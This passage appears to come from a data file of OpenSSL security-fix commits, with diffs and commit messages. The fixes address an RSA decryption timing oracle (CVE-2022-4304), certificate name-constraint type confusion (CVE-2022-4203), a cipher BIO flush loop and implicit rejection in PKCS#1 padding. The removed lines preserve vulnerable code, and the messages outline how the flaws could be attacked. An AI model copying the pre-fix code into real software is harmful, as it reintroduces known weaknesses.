    +        ERR_raise(ERR_LIB_BN, ERR_R_PASSED_INVALID_ARGUMENT);

    +        goto err;

    +    }

    +

    +    memset(buf, 0, num);

    +    tmp = buf + num - BN_num_bytes(to_mod);

    +    for (i = 0; i < l_mod_count; i++) {

    +#if LIMB_BYTE_SIZE == 8

    +        l_buf = be64(l_ret[i]);

    +#else

    +        l_buf = be32(l_ret[i]);

    +#endif

    +        if (i == 0) {

    +            int delta = LIMB_BYTE_SIZE - ((l_mod_count * LIMB_BYTE_SIZE) - num);

    +

    +            memcpy(tmp, ((char *)&l_buf) + LIMB_BYTE_SIZE - delta, delta);

    +            tmp += delta;

    +        } else {

    +            memcpy(tmp, &l_buf, LIMB_BYTE_SIZE);

    +            tmp += LIMB_BYTE_SIZE;

    +        }

    +    }

    +    ret = num;

    +

    + err:

    +    OPENSSL_free(l_im);

    +    OPENSSL_free(l_mul);

    +    OPENSSL_free(l_mod);

    +    OPENSSL_free(l_tmp);

    +    OPENSSL_free(l_ret);

    +

    +    return ret;

    +}'
  - "--- a/crypto/rsa/rsa_ossl.c\n+++ b/crypto/rsa/rsa_ossl.c\n@@ -369,19 +369,100\
    \ @@ static int rsa_ossl_private_encrypt(int flen, const unsigned char *from,\n\
    \     return r;\n }\n \n+static int derive_kdk(int flen, const unsigned char *from,\
    \ RSA *rsa,\n+                      unsigned char *buf, int num, unsigned char\
    \ *kdk)\n+{\n+    int ret = 0;\n+    HMAC_CTX *hmac = NULL;\n+    EVP_MD *md =\
    \ NULL;\n+    unsigned int md_len = SHA256_DIGEST_LENGTH;\n+    unsigned char\
    \ d_hash[SHA256_DIGEST_LENGTH] = {0};\n+    /*\n+     * because we use d as a\
    \ handle to rsa->d we need to keep it local and\n+     * free before any further\
    \ use of rsa->d\n+     */\n+    BIGNUM *d = BN_new();\n+\n+    if (d == NULL)\
    \ {\n+        ERR_raise(ERR_LIB_RSA, ERR_R_CRYPTO_LIB);\n+        goto err;\n\
    +    }\n+    if (rsa->d == NULL) {\n+        ERR_raise(ERR_LIB_RSA, RSA_R_MISSING_PRIVATE_KEY);\n\
    +        BN_free(d);\n+        goto err;\n+    }\n+    BN_with_flags(d, rsa->d,\
    \ BN_FLG_CONSTTIME);\n+    if (BN_bn2binpad(d, buf, num) < 0) {\n+        ERR_raise(ERR_LIB_RSA,\
    \ ERR_R_INTERNAL_ERROR);\n+        BN_free(d);\n+        goto err;\n+    }\n+\
    \    BN_free(d);\n+\n+    /*\n+     * we use hardcoded hash so that migrating\
    \ between versions that use\n+     * different hash doesn't provide a Bleichenbacher\
    \ oracle:\n+     * if the attacker can see that different versions return different\n\
    +     * messages for the same ciphertext, they'll know that the message is\n+\
    \     * syntethically generated, which means that the padding check failed\n+\
    \     */\n+    md = EVP_MD_fetch(rsa->libctx, \"sha256\", NULL);\n+    if (md\
    \ == NULL) {\n+        ERR_raise(ERR_LIB_RSA, ERR_R_FETCH_FAILED);\n+        goto\
    \ err;\n+    }\n+\n+    if (EVP_Digest(buf, num, d_hash, NULL, md, NULL) <= 0)\
    \ {\n+        ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n+        goto err;\n\
    +    }\n+\n+    hmac = HMAC_CTX_new();\n+    if (hmac == NULL) {\n+        ERR_raise(ERR_LIB_RSA,\
    \ ERR_R_CRYPTO_LIB);\n+        goto err;\n+    }\n+\n+    if (HMAC_Init_ex(hmac,\
    \ d_hash, sizeof(d_hash), md, NULL) <= 0) {\n+        ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    +        goto err;\n+    }\n+\n+    if (flen < num) {\n+        memset(buf, 0,\
    \ num - flen);\n+        if (HMAC_Update(hmac, buf, num - flen) <= 0) {\n+   \
    \         ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n+            goto err;\n\
    +        }\n+    }\n+    if (HMAC_Update(hmac, from, flen) <= 0) {\n+        ERR_raise(ERR_LIB_RSA,\
    \ ERR_R_INTERNAL_ERROR);\n+        goto err;\n+    }\n+\n+    md_len = SHA256_DIGEST_LENGTH;\n\
    +    if (HMAC_Final(hmac, kdk, &md_len) <= 0) {\n+        ERR_raise(ERR_LIB_RSA,\
    \ ERR_R_INTERNAL_ERROR);\n+        goto err;\n+    }\n+    ret = 1;\n+\n+ err:\n\
    +    HMAC_CTX_free(hmac);\n+    EVP_MD_free(md);\n+    return ret;\n+}\n+\n static\
    \ int rsa_ossl_private_decrypt(int flen, const unsigned char *from,\n        \
    \                            unsigned char *to, RSA *rsa, int padding)\n {\n \
    \    BIGNUM *f, *ret;\n     int j, num = 0, r = -1;\n     unsigned char *buf =\
    \ NULL;\n-    unsigned char d_hash[SHA256_DIGEST_LENGTH] = {0};\n-    HMAC_CTX\
    \ *hmac = NULL;\n-    unsigned int md_len = SHA256_DIGEST_LENGTH;\n     unsigned\
    \ char kdk[SHA256_DIGEST_LENGTH] = {0};\n     BN_CTX *ctx = NULL;\n     int local_blinding\
    \ = 0;\n-    EVP_MD *md = NULL;\n     /*\n      * Used only if the blinding structure\
    \ is shared. A non-NULL unblind\n      * instructs rsa_blinding_convert() and\
    \ rsa_blinding_invert() to store\n@@ -486,89 +567,30 @@ static int rsa_ossl_private_decrypt(int\
    \ flen, const unsigned char *from,\n         BN_free(d);\n     }\n \n-    if (blinding)\n\
    -        if (!rsa_blinding_invert(blinding, ret, unblind, ctx))\n-           \
    \ goto err;\n-\n     /*\n      * derive the Key Derivation Key from private exponent\
    \ and public\n      * ciphertext\n      */\n     if (padding == RSA_PKCS1_PADDING)\
    \ {\n-        /*\n-         * because we use d as a handle to rsa->d we need to\
    \ keep it local and\n-         * free before any further use of rsa->d\n-    \
    \     */\n-        BIGNUM *d = BN_new();\n-        if (d == NULL) {\n-       \
    \     ERR_raise(ERR_LIB_RSA, ERR_R_MALLOC_FAILURE);\n+        if (derive_kdk(flen,\
    \ from, rsa, buf, num, kdk) == 0)\n             goto err;\n-        }\n-     \
    \   if (rsa->d == NULL) {\n-            ERR_raise(ERR_LIB_RSA, RSA_R_MISSING_PRIVATE_KEY);\n\
    -            BN_free(d);\n-            goto err;\n-        }\n-        BN_with_flags(d,\
    \ rsa->d, BN_FLG_CONSTTIME);\n-        if (BN_bn2binpad(d, buf, num) < 0) {\n\
    -            ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n-            BN_free(d);\n\
    -            goto err;\n-        }\n-        BN_free(d);\n+    }\n \n+    if (blinding)\
    \ {\n         /*\n-         * we use hardcoded hash so that migrating between\
    \ versions that use\n-         * different hash doesn't provide a Bleichenbacher\
    \ oracle:\n-         * if the attacker can see that different versions return\
    \ different\n-         * messages for the same ciphertext, they'll know that the\
    \ message is\n-         * syntethically generated, which means that the padding\
    \ check failed\n+         * ossl_bn_rsa_do_unblind() combines blinding inversion\
    \ and\n+         * 0-padded BN BE serialization\n          */\n-        md = EVP_MD_fetch(rsa->libctx,\
    \ \"sha256\", NULL);\n-        if (md == NULL) {\n-            ERR_raise(ERR_LIB_RSA,\
    \ ERR_R_INTERNAL_ERROR);\n-            goto err;\n-        }\n-\n-        if (EVP_Digest(buf,\
    \ num, d_hash, NULL, md, NULL) <= 0) {\n-            ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    +        j = ossl_bn_rsa_do_unblind(ret, blinding, unblind, rsa->n, ctx,\n+  \
    \                                 buf, num);\n+        if (j == 0)\n         \
    \    goto err;\n-        }\n-\n-        hmac = HMAC_CTX_new();\n-        if (hmac\
    \ == NULL) {\n-            ERR_raise(ERR_LIB_RSA, ERR_R_MALLOC_FAILURE);\n-  \
    \          goto err;\n-        }\n-\n-        if (HMAC_Init_ex(hmac, d_hash, sizeof(d_hash),\
    \ md, NULL) <= 0) {\n-            ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    -            goto err;\n-        }\n-\n-        if (flen < num) {\n-         \
    \   memset(buf, 0, num - flen);\n-            if (HMAC_Update(hmac, buf, num -\
    \ flen) <= 0) {\n-                ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    -                goto err;\n-            }\n-        }\n-        if (HMAC_Update(hmac,\
    \ from, flen) <= 0) {\n-            ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    -            goto err;\n-        }\n-\n-        md_len = SHA256_DIGEST_LENGTH;\n\
    -        if (HMAC_Final(hmac, kdk, &md_len) <= 0) {\n-            ERR_raise(ERR_LIB_RSA,\
    \ ERR_R_INTERNAL_ERROR);\n+    } else {\n+        j = BN_bn2binpad(ret, buf, num);\n\
    +        if (j < 0)\n             goto err;\n-        }\n     }\n \n-    j = BN_bn2binpad(ret,\
    \ buf, num);\n-    if (j < 0)\n-        goto err;\n-\n     switch (padding) {\n\
    \     case RSA_PKCS1_NO_IMPLICIT_REJECT_PADDING:\n         r = RSA_padding_check_PKCS1_type_2(to,\
    \ num, buf, j, num);\n@@ -597,8 +619,6 @@ static int rsa_ossl_private_decrypt(int\
    \ flen, const unsigned char *from,\n #endif\n \n  err:\n-    HMAC_CTX_free(hmac);\n\
    -    EVP_MD_free(md);\n     BN_CTX_end(ctx);\n     BN_CTX_free(ctx);\n     OPENSSL_clear_free(buf,\
    \ num);"
  commit_message: 'Fix Timing Oracle in RSA decryption


    A timing based side channel exists in the OpenSSL RSA Decryption

    implementation which could be sufficient to recover a plaintext across

    a network in a Bleichenbacher style attack. To achieve a successful

    decryption an attacker would have to be able to send a very large number

    of trial messages for decryption. The vulnerability affects all RSA

    padding modes: PKCS#1 v1.5, RSA-OEAP and RSASVE.


    Patch written by Dmitry Belyavsky and Hubert Kario


    CVE-2022-4304


    Reviewed-by: Matt Caswell <matt@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>'
  commit_sha: b1892d21f8f0435deb0250f24a97915dc641c807
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/x509/v3_ncons.c\n+++ b/crypto/x509/v3_ncons.c\n@@ -34,7 +34,8 @@\
    \ static int do_i2r_name_constraints(const X509V3_EXT_METHOD *method,\n static\
    \ int print_nc_ipadd(BIO *bp, ASN1_OCTET_STRING *ip);\n \n static int nc_match(GENERAL_NAME\
    \ *gen, NAME_CONSTRAINTS *nc);\n-static int nc_match_single(GENERAL_NAME *sub,\
    \ GENERAL_NAME *gen);\n+static int nc_match_single(int effective_type, GENERAL_NAME\
    \ *sub,\n+                           GENERAL_NAME *gen);\n static int nc_dn(const\
    \ X509_NAME *sub, const X509_NAME *nm);\n static int nc_dns(ASN1_IA5STRING *sub,\
    \ ASN1_IA5STRING *dns);\n static int nc_email(ASN1_IA5STRING *sub, ASN1_IA5STRING\
    \ *eml);\n@@ -481,14 +482,17 @@ static int nc_match(GENERAL_NAME *gen, NAME_CONSTRAINTS\
    \ *nc)\n {\n     GENERAL_SUBTREE *sub;\n     int i, r, match = 0;\n+    int effective_type\
    \ = gen->type;\n+\n     /*\n      * We need to compare not gen->type field but\
    \ an \"effective\" type because\n      * the otherName field may contain EAI email\
    \ address treated specially\n      * according to RFC 8398, section 6\n      */\n\
    -    int effective_type = ((gen->type == GEN_OTHERNAME) &&\n-                \
    \          (OBJ_obj2nid(gen->d.otherName->type_id) ==\n-                     \
    \      NID_id_on_SmtpUTF8Mailbox)) ? GEN_EMAIL : gen->type;\n+    if (effective_type\
    \ == GEN_OTHERNAME &&\n+        (OBJ_obj2nid(gen->d.otherName->type_id) == NID_id_on_SmtpUTF8Mailbox))\
    \ {\n+        effective_type = GEN_EMAIL;\n+    }\n \n     /*\n      * Permitted\
    \ subtrees: if any subtrees exist of matching the type at\n@@ -497,7 +501,10 @@\
    \ static int nc_match(GENERAL_NAME *gen, NAME_CONSTRAINTS *nc)\n \n     for (i\
    \ = 0; i < sk_GENERAL_SUBTREE_num(nc->permittedSubtrees); i++) {\n         sub\
    \ = sk_GENERAL_SUBTREE_value(nc->permittedSubtrees, i);\n-        if (effective_type\
    \ != sub->base->type)\n+        if (effective_type != sub->base->type\n+     \
    \       || (effective_type == GEN_OTHERNAME &&\n+                OBJ_cmp(gen->d.otherName->type_id,\n\
    +                        sub->base->d.otherName->type_id) != 0))\n           \
    \  continue;\n         if (!nc_minmax_valid(sub))\n             return X509_V_ERR_SUBTREE_MINMAX;\n\
    @@ -506,7 +513,7 @@ static int nc_match(GENERAL_NAME *gen, NAME_CONSTRAINTS *nc)\n\
    \             continue;\n         if (match == 0)\n             match = 1;\n-\
    \        r = nc_match_single(gen, sub->base);\n+        r = nc_match_single(effective_type,\
    \ gen, sub->base);\n         if (r == X509_V_OK)\n             match = 2;\n  \
    \       else if (r != X509_V_ERR_PERMITTED_VIOLATION)\n@@ -520,12 +527,15 @@ static\
    \ int nc_match(GENERAL_NAME *gen, NAME_CONSTRAINTS *nc)\n \n     for (i = 0; i\
    \ < sk_GENERAL_SUBTREE_num(nc->excludedSubtrees); i++) {\n         sub = sk_GENERAL_SUBTREE_value(nc->excludedSubtrees,\
    \ i);\n-        if (effective_type != sub->base->type)\n+        if (effective_type\
    \ != sub->base->type\n+            || (effective_type == GEN_OTHERNAME &&\n+ \
    \               OBJ_cmp(gen->d.otherName->type_id,\n+                        sub->base->d.otherName->type_id)\
    \ != 0))\n             continue;\n         if (!nc_minmax_valid(sub))\n      \
    \       return X509_V_ERR_SUBTREE_MINMAX;\n \n-        r = nc_match_single(gen,\
    \ sub->base);\n+        r = nc_match_single(effective_type, gen, sub->base);\n\
    \         if (r == X509_V_OK)\n             return X509_V_ERR_EXCLUDED_VIOLATION;\n\
    \         else if (r != X509_V_ERR_PERMITTED_VIOLATION)\n@@ -537,15 +547,22 @@\
    \ static int nc_match(GENERAL_NAME *gen, NAME_CONSTRAINTS *nc)\n \n }\n \n-static\
    \ int nc_match_single(GENERAL_NAME *gen, GENERAL_NAME *base)\n+static int nc_match_single(int\
    \ effective_type, GENERAL_NAME *gen,\n+                           GENERAL_NAME\
    \ *base)\n {\n     switch (gen->type) {\n     case GEN_OTHERNAME:\n-        /*\n\
    -         * We are here only when we have SmtpUTF8 name,\n-         * so we match\
    \ the value of othername with base->d.rfc822Name\n-         */\n-        return\
    \ nc_email_eai(gen->d.otherName->value, base->d.rfc822Name);\n+        switch\
    \ (effective_type) {\n+        case GEN_EMAIL:\n+            /*\n+           \
    \  * We are here only when we have SmtpUTF8 name,\n+             * so we match\
    \ the value of othername with base->d.rfc822Name\n+             */\n+        \
    \    return nc_email_eai(gen->d.otherName->value, base->d.rfc822Name);\n+\n+ \
    \       default:\n+            return X509_V_ERR_UNSUPPORTED_CONSTRAINT_TYPE;\n\
    +        }\n \n     case GEN_DIRNAME:\n         return nc_dn(gen->d.directoryName,\
    \ base->d.directoryName);"
  commit_message: 'Fix type confusion in nc_match_single()


    This function assumes that if the "gen" is an OtherName, then the "base"

    is a rfc822Name constraint. This assumption is not true in all cases.

    If the end-entity certificate contains an OtherName SAN of any type besides

    SmtpUtf8Mailbox and the CA certificate contains a name constraint of

    OtherName (of any type), then "nc_email_eai" will be invoked, with the

    OTHERNAME "base" being incorrectly interpreted as a ASN1_IA5STRING.


    Reported by Corey Bonnell from Digicert.


    CVE-2022-4203


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Richard Levitte <levitte@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>'
  commit_sha: 748f478f814bc8e418542c68599ec7dbcbac97b2
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/evp/bio_enc.c\n+++ b/crypto/evp/bio_enc.c\n@@ -297,6 +297,7 @@ static\
    \ long enc_ctrl(BIO *b, int cmd, long num, void *ptr)\n     int i;\n     EVP_CIPHER_CTX\
    \ **c_ctx;\n     BIO *next;\n+    int pend;\n \n     ctx = BIO_get_data(b);\n\
    \     next = BIO_next(b);\n@@ -332,8 +333,14 @@ static long enc_ctrl(BIO *b, int\
    \ cmd, long num, void *ptr)\n         /* do a final write */\n  again:\n     \
    \    while (ctx->buf_len != ctx->buf_off) {\n+            pend = ctx->buf_len\
    \ - ctx->buf_off;\n             i = enc_write(b, NULL, 0);\n-            if (i\
    \ < 0)\n+            /*\n+             * i should never be > 0 here because we\
    \ didn't ask to write any\n+             * new data. We stop if we get an error\
    \ or we failed to make any\n+             * progress writing pending data.\n+\
    \             */\n+            if (i < 0 || (ctx->buf_len - ctx->buf_off) == pend)\n\
    \                 return i;\n         }\n "
  commit_message: 'Fix BIO_f_cipher() flushing


    If an error occurs during a flush on a BIO_f_cipher() then in some cases

    we could get into an infinite loop. We add a check to make sure we are

    making progress during flush and exit if not.


    This issue was reported by Octavio Galland who also demonstrated an

    infinite loop in CMS encryption as a result of this bug.


    The security team has assessed this issue as not a CVE. This occurs on

    *encryption* only which is typically processing trusted data. We are not

    aware of a way to trigger this with untrusted data.


    Reviewed-by: Hugo Landau <hlandau@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/19918)'
  commit_sha: e51dd6ee1bac6b54debea3f48c6f58b761229b73
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/rsa/rsa_ossl.c\n+++ b/crypto/rsa/rsa_ossl.c\n@@ -17,6 +17,9 @@\n\
    \ #include \"crypto/bn.h\"\n #include \"rsa_local.h\"\n #include \"internal/constant_time.h\"\
    \n+#include <openssl/evp.h>\n+#include <openssl/sha.h>\n+#include <openssl/hmac.h>\n\
    \ \n static int rsa_ossl_public_encrypt(int flen, const unsigned char *from,\n\
    \                                   unsigned char *to, RSA *rsa, int padding);\n\
    @@ -372,8 +375,13 @@ static int rsa_ossl_private_decrypt(int flen, const unsigned\
    \ char *from,\n     BIGNUM *f, *ret;\n     int j, num = 0, r = -1;\n     unsigned\
    \ char *buf = NULL;\n+    unsigned char d_hash[SHA256_DIGEST_LENGTH] = {0};\n\
    +    HMAC_CTX *hmac = NULL;\n+    unsigned int md_len = SHA256_DIGEST_LENGTH;\n\
    +    unsigned char kdk[SHA256_DIGEST_LENGTH] = {0};\n     BN_CTX *ctx = NULL;\n\
    \     int local_blinding = 0;\n+    EVP_MD *md = NULL;\n     /*\n      * Used\
    \ only if the blinding structure is shared. A non-NULL unblind\n      * instructs\
    \ rsa_blinding_convert() and rsa_blinding_invert() to store\n@@ -405,6 +413,11\
    \ @@ static int rsa_ossl_private_decrypt(int flen, const unsigned char *from,\n\
    \         goto err;\n     }\n \n+    if (flen < 1) {\n+        ERR_raise(ERR_LIB_RSA,\
    \ RSA_R_DATA_TOO_SMALL);\n+        goto err;\n+    }\n+\n     /* make data into\
    \ a big number */\n     if (BN_bin2bn(from, (int)flen, f) == NULL)\n         goto\
    \ err;\n@@ -471,13 +484,91 @@ static int rsa_ossl_private_decrypt(int flen, const\
    \ unsigned char *from,\n         if (!rsa_blinding_invert(blinding, ret, unblind,\
    \ ctx))\n             goto err;\n \n+    /*\n+     * derive the Key Derivation\
    \ Key from private exponent and public\n+     * ciphertext\n+     */\n+    if\
    \ (!(rsa->flags & RSA_FLAG_EXT_PKEY)) {\n+        /*\n+         * because we use\
    \ d as a handle to rsa->d we need to keep it local and\n+         * free before\
    \ any further use of rsa->d\n+         */\n+        BIGNUM *d = BN_new();\n+ \
    \       if (d == NULL) {\n+            ERR_raise(ERR_LIB_RSA, ERR_R_MALLOC_FAILURE);\n\
    +            goto err;\n+        }\n+        if (rsa->d == NULL) {\n+        \
    \    ERR_raise(ERR_LIB_RSA, RSA_R_MISSING_PRIVATE_KEY);\n+            BN_free(d);\n\
    +            goto err;\n+        }\n+        BN_with_flags(d, rsa->d, BN_FLG_CONSTTIME);\n\
    +        if (BN_bn2binpad(d, buf, num) < 0) {\n+            ERR_raise(ERR_LIB_RSA,\
    \ ERR_R_INTERNAL_ERROR);\n+            BN_free(d);\n+            goto err;\n+\
    \        }\n+        BN_free(d);\n+\n+        /*\n+         * we use hardcoded\
    \ hash so that migrating between versions that use\n+         * different hash\
    \ doesn't provide a Bleichenbacher oracle:\n+         * if the attacker can see\
    \ that different versions return different\n+         * messages for the same\
    \ ciphertext, they'll know that the message is\n+         * syntethically generated,\
    \ which means that the padding check failed\n+         */\n+        md = EVP_MD_fetch(rsa->libctx,\
    \ \"sha256\", NULL);\n+        if (md == NULL) {\n+            ERR_raise(ERR_LIB_RSA,\
    \ ERR_R_INTERNAL_ERROR);\n+            goto err;\n+        }\n+\n+        if (EVP_Digest(buf,\
    \ num, d_hash, NULL, md, NULL) <= 0) {\n+            ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    +            goto err;\n+        }\n+\n+        hmac = HMAC_CTX_new();\n+    \
    \    if (hmac == NULL) {\n+            ERR_raise(ERR_LIB_RSA, ERR_R_MALLOC_FAILURE);\n\
    +            goto err;\n+        }\n+\n+        if (HMAC_Init_ex(hmac, d_hash,\
    \ sizeof(d_hash), md, NULL) <= 0) {\n+            ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    +            goto err;\n+        }\n+\n+        if (flen < num) {\n+         \
    \   memset(buf, 0, num - flen);\n+            if (HMAC_Update(hmac, buf, num -\
    \ flen) <= 0) {\n+                ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    +                goto err;\n+            }\n+        }\n+        if (HMAC_Update(hmac,\
    \ from, flen) <= 0) {\n+            ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    +            goto err;\n+        }\n+\n+        md_len = SHA256_DIGEST_LENGTH;\n\
    +        if (HMAC_Final(hmac, kdk, &md_len) <= 0) {\n+            ERR_raise(ERR_LIB_RSA,\
    \ ERR_R_INTERNAL_ERROR);\n+            goto err;\n+        }\n+    }\n+\n    \
    \ j = BN_bn2binpad(ret, buf, num);\n     if (j < 0)\n         goto err;\n \n \
    \    switch (padding) {\n     case RSA_PKCS1_PADDING:\n-        r = RSA_padding_check_PKCS1_type_2(to,\
    \ num, buf, j, num);\n+        if (rsa->flags & RSA_FLAG_EXT_PKEY)\n+        \
    \    r = RSA_padding_check_PKCS1_type_2(to, num, buf, j, num);\n+        else\n\
    +            r = ossl_rsa_padding_check_PKCS1_type_2(rsa->libctx, to, num, buf,\
    \ j, num, kdk);\n         break;\n     case RSA_PKCS1_OAEP_PADDING:\n        \
    \ r = RSA_padding_check_PKCS1_OAEP(to, num, buf, j, num, NULL, 0);\n@@ -500,6\
    \ +591,8 @@ static int rsa_ossl_private_decrypt(int flen, const unsigned char\
    \ *from,\n #endif\n \n  err:\n+    HMAC_CTX_free(hmac);\n+    EVP_MD_free(md);\n\
    \     BN_CTX_end(ctx);\n     BN_CTX_free(ctx);\n     OPENSSL_clear_free(buf, num);"
  - "--- a/crypto/rsa/rsa_pk1.c\n+++ b/crypto/rsa/rsa_pk1.c\n@@ -21,10 +21,14 @@\n\
    \ #include <openssl/rand.h>\n /* Just for the SSL_MAX_MASTER_KEY_LENGTH value\
    \ */\n #include <openssl/prov_ssl.h>\n+#include <openssl/evp.h>\n+#include <openssl/sha.h>\n\
    +#include <openssl/hmac.h>\n #include \"internal/cryptlib.h\"\n #include \"crypto/rsa.h\"\
    \n #include \"rsa_local.h\"\n \n+\n int RSA_padding_add_PKCS1_type_1(unsigned\
    \ char *to, int tlen,\n                                  const unsigned char *from,\
    \ int flen)\n {\n@@ -271,6 +275,254 @@ int RSA_padding_check_PKCS1_type_2(unsigned\
    \ char *to, int tlen,\n     return constant_time_select_int(good, mlen, -1);\n\
    \ }\n \n+\n+static int ossl_rsa_prf(OSSL_LIB_CTX *ctx,\n+                    \
    \    unsigned char *to, int tlen,\n+                        const char *label,\
    \ int llen,\n+                        const unsigned char *kdk,\n+           \
    \             uint16_t bitlen)\n+{\n+    int pos;\n+    int ret = -1;\n+    uint16_t\
    \ iter = 0;\n+    unsigned char be_iter[sizeof(iter)];\n+    unsigned char be_bitlen[sizeof(bitlen)];\n\
    +    HMAC_CTX *hmac = NULL;\n+    EVP_MD *md = NULL;\n+    unsigned char hmac_out[SHA256_DIGEST_LENGTH];\n\
    +    unsigned int md_len;\n+\n+    if (tlen * 8 != bitlen) {\n+        ERR_raise(ERR_LIB_RSA,\
    \ ERR_R_INTERNAL_ERROR);\n+        return ret;\n+    }\n+\n+    be_bitlen[0] =\
    \ (bitlen >> 8) & 0xff;\n+    be_bitlen[1] = bitlen & 0xff;\n+\n+    hmac = HMAC_CTX_new();\n\
    +    if (hmac == NULL) {\n+        ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    +        goto err;\n+    }\n+\n+    /*\n+     * we use hardcoded hash so that\
    \ migrating between versions that use\n+     * different hash doesn't provide\
    \ a Bleichenbacher oracle:\n+     * if the attacker can see that different versions\
    \ return different\n+     * messages for the same ciphertext, they'll know that\
    \ the message is\n+     * syntethically generated, which means that the padding\
    \ check failed\n+     */\n+    md = EVP_MD_fetch(ctx, \"sha256\", NULL);\n+  \
    \  if (md == NULL) {\n+        ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    +        goto err;\n+    }\n+\n+    if (HMAC_Init_ex(hmac, kdk, SHA256_DIGEST_LENGTH,\
    \ md, NULL) <= 0) {\n+        ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    +        goto err;\n+    }\n+\n+    for (pos = 0; pos < tlen; pos += SHA256_DIGEST_LENGTH,\
    \ iter++) {\n+        if (HMAC_Init_ex(hmac, NULL, 0, NULL, NULL) <= 0) {\n+ \
    \           ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n+            goto err;\n\
    +        }\n+\n+        be_iter[0] = (iter >> 8) & 0xff;\n+        be_iter[1]\
    \ = iter & 0xff;\n+\n+        if (HMAC_Update(hmac, be_iter, sizeof(be_iter))\
    \ <= 0) {\n+            ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n+     \
    \       goto err;\n+        }\n+        if (HMAC_Update(hmac, (unsigned char *)label,\
    \ llen) <= 0) {\n+            ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    +            goto err;\n+        }\n+        if (HMAC_Update(hmac, be_bitlen,\
    \ sizeof(be_bitlen)) <= 0) {\n+            ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    +            goto err;\n+        }\n+\n+        /*\n+         * HMAC_Final requires\
    \ the output buffer to fit the whole MAC\n+         * value, so we need to use\
    \ the intermediate buffer for the last\n+         * unaligned block\n+       \
    \  */\n+        md_len = SHA256_DIGEST_LENGTH;\n+        if (pos + SHA256_DIGEST_LENGTH\
    \ > tlen) {\n+            if (HMAC_Final(hmac, hmac_out, &md_len) <= 0) {\n+ \
    \               ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n+             \
    \   goto err;\n+            }\n+            memcpy(to + pos, hmac_out, tlen -\
    \ pos);\n+        } else {\n+            if (HMAC_Final(hmac, to + pos, &md_len)\
    \ <= 0) {\n+                ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n+ \
    \               goto err;\n+            }\n+        }\n+    }\n+\n+    ret = 0;\n\
    +\n+err:\n+    HMAC_CTX_free(hmac);\n+    EVP_MD_free(md);\n+    return ret;\n\
    +}\n+\n+/*\n+ * ossl_rsa_padding_check_PKCS1_type_2() checks and removes the PKCS#1\
    \ type 2\n+ * padding from a decrypted RSA message. Unlike the\n+ * RSA_padding_check_PKCS1_type_2()\
    \ it will not return an error in case it\n+ * detects a padding error, rather\
    \ it will return a deterministically generated\n+ * random message. In other words\
    \ it will perform an implicit rejection\n+ * of an invalid padding. This means\
    \ that the returned value does not indicate\n+ * if the padding of the encrypted\
    \ message was correct or not, making\n+ * side channel attacks like the ones described\
    \ by Bleichenbacher impossible\n+ * without access to the full decrypted value\
    \ and a brute-force search of\n+ * remaining padding bytes\n+ */\n+int ossl_rsa_padding_check_PKCS1_type_2(OSSL_LIB_CTX\
    \ *ctx,\n+                                        unsigned char *to, int tlen,\n\
    +                                        const unsigned char *from, int flen,\n\
    +                                        int num, unsigned char *kdk)\n+{\n+/*\n\
    + * We need to generate a random length for the synthethic message, to avoid\n\
    + * bias towards zero and avoid non-constant timeness of DIV, we prepare\n+ *\
    \ 128 values to check if they are not too large for the used key size,\n+ * and\
    \ use 0 in case none of them are small enough, as 2^-128 is a good enough\n+ *\
    \ safety margin\n+ */\n+#define MAX_LEN_GEN_TRIES 128\n+    unsigned char *synthetic\
    \ = NULL;\n+    int synthethic_length;\n+    uint16_t len_candidate;\n+    unsigned\
    \ char candidate_lengths[MAX_LEN_GEN_TRIES * sizeof(len_candidate)];\n+    uint16_t\
    \ len_mask;\n+    uint16_t max_sep_offset;\n+    int synth_msg_index = 0;\n+ \
    \   int ret = -1;\n+    int i, j;\n+    unsigned int good, found_zero_byte;\n\
    +    int zero_index = 0, msg_index;\n+\n+    /*\n+     * If these checks fail\
    \ then either the message in publicly invalid, or\n+     * we've been called incorrectly.\
    \ We can fail immediately.\n+     * Since this code is called only internally\
    \ by openssl, those are just\n+     * sanity checks\n+     */\n+    if (num !=\
    \ flen || tlen <= 0 || flen <= 0) {\n+        ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    +        return -1;\n+    }\n+\n+    /* Generate a random message to return in\
    \ case the padding checks fail */\n+    synthetic = OPENSSL_malloc(flen);\n+ \
    \   if (synthetic == NULL) {\n+        ERR_raise(ERR_LIB_RSA, ERR_R_MALLOC_FAILURE);\n\
    +        return -1;\n+    }\n+\n+    if (ossl_rsa_prf(ctx, synthetic, flen, \"\
